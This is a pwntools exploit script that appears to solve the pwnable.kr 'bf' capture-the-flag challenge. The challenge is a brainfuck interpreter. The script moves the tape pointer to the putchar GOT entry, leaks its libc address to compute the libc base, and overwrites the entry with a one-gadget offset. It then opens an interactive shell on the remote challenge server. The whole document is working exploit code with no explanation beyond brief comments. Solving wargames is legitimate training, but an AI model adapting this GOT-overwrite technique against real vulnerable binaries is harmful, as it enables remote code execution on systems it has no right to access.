from pwn import *
context.log_level = 'debug'
elf = ELF("./bf")
libc = ELF("./bf_libc.so")
   # address
tape_addr = 0x0804A0A0
putchar_addr = 0x0804A030
putchar_libc_offset = libc.symbols['putchar']   
raw_libc_base_addr = ''
# build payload
payload = '' 
payload += '<' * (tape_addr - putchar_addr) # move to putchar address(0x0804A030)
payload += '.' # load putchar into plt (for the time to use putchar)
payload += '.>' * 0x4 # load putchar real address
payload += '<' * 0x4 + ',>' * 0x4 # overload putchar
payload += '.' # getshell
log.info("start send")
p = remote('pwnable.kr',9001)
#p = process("./bf")
p.recvuntil('welcome to brainfuck testing system!!\ntype some brainfuck instructions except [ ]\n')
p.sendline(payload)
log.info("send end")
# libc_base_addr
p.recv(1) # recv the first time call putchar junk info
raw_libc_base_addr = u32(p.recv(4))
libc_base_addr = raw_libc_base_addr - putchar_libc_offset # recv_addr - offset == base_addr
p.send(p32(libc_base_addr + 0x5fbc5)) # 将one-gadget偏移地址填在这里，现在给出的偏移地址为试验成功的。0x5fbc6也是可以的。
p.interactive()